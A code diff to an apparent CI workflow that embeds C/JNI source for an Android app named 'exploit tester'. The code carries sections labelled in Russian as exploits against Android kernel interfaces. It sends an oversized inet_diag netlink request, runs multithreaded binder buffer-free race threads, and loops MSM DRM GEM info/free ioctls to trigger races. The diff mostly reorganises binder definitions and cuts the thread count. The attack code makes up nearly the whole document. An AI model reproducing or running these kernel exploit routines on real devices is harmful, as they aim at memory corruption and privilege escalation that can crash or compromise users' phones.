@@ -256,7 +256,20 @@ jobs:
           #include <sys/ioctl.h>
           #include <linux/netlink.h>
           #include <linux/inet_diag.h>
-          #include <linux/binder.h>
+          #include <linux/sock_diag.h>
+          
+          // ==================== ОПРЕДЕЛЕНИЯ ДЛЯ BINDER (без linux/binder.h) ====================
+          #define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
+          #define BC_FREE_BUFFER 0x03
+          
+          struct binder_write_read {
+              signed long write_size;
+              signed long write_consumed;
+              unsigned long write_buffer;
+              signed long read_size;
+              signed long read_consumed;
+              unsigned long read_buffer;
+          };
           
           // ==================== ЭКСПЛОЙТ 1: inet_diag ====================
           JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenNetlink(JNIEnv *env, jobject thiz) {
@@ -269,6 +282,7 @@ jobs:
                   struct inet_diag_req_v2 req;
                   char overflow[4096];
               } msg;
+              
               memset(&msg, 0, sizeof(msg));
               msg.nlh.nlmsg_len = 0xFFFF;
               msg.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
@@ -276,22 +290,12 @@ jobs:
               msg.req.sdiag_family = AF_INET;
               msg.req.idiag_states = 0xFFFFFFFF;
               memset(msg.overflow, 0, sizeof(msg.overflow));
+              
               int ret = send(sock, &msg, sizeof(msg), 0);
               return ret > 0 ? JNI_TRUE : JNI_FALSE;
           }
           
           // ==================== ЭКСПЛОЙТ 2: binder ====================
-          struct binder_write_read {
-              signed long write_size;
-              signed long write_consumed;
-              unsigned long write_buffer;
-              signed long read_size;
-              signed long read_consumed;
-              unsigned long read_buffer;
-          };
-          #define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
-          #define BC_FREE_BUFFER 0x03
-          
           static int binder_running = 1;
           static int g_binder_fd = -1;
           
@@ -311,11 +315,10 @@ jobs:
           JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeStartBinderRace(JNIEnv *env, jobject thiz, jint fd) {
               g_binder_fd = fd;
               binder_running = 1;
-              pthread_t threads[8];
-              for (int i = 0; i < 8; i++) {
+              pthread_t threads[6];
+              for (int i = 0; i < 6; i++) {
                   pthread_create(&threads[i], NULL, binder_race_thread, NULL);
               }
-              // Останавливаем через 5 секунд
               sleep(5);
               binder_running = 0;
           }
@@ -329,7 +332,6 @@ jobs:
           }
           
           JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerDrmRace(JNIEnv *env, jobject thiz, jint fd) {
-              // Упрощённый race для DRM
               for (int i = 0; i < 100; i++) {
                   ioctl(fd, MSM_IOCTL_GEM_INFO, NULL);
                   ioctl(fd, MSM_IOCTL_GEM_FREE, NULL);
